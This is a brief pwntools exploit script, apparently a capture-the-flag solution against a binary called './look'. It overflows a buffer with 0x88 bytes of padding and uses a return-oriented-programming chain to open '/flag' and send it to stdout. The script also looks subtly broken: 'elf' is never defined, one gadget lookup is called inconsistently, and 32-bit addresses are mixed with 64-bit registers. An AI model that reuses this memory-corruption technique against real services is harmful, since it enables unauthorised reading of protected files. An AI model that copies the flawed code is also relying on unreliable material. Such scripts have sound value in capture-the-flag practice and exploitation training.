from pwn import *
import re

binary = './look'
rop = ROP(elf)


def syscall(**kwargs):
    for reg, val in kwargs.items():
        rop.raw(rop.find_gadget(f'pop {reg}', "ret").address)
        rop.raw(val)
    rop.raw(rop.find_gadget(['syscall', 'ret']).address)


input_addr = 0x804a080
syscall(rax=2, rdi=input_addr, rsi=0)
syscall(rax=40, rdi=1, rsi=3, rdx=0, r10=1024)

padding = b'a' * 0x88
payload = b'/flag\0' + padding + rop.chain()
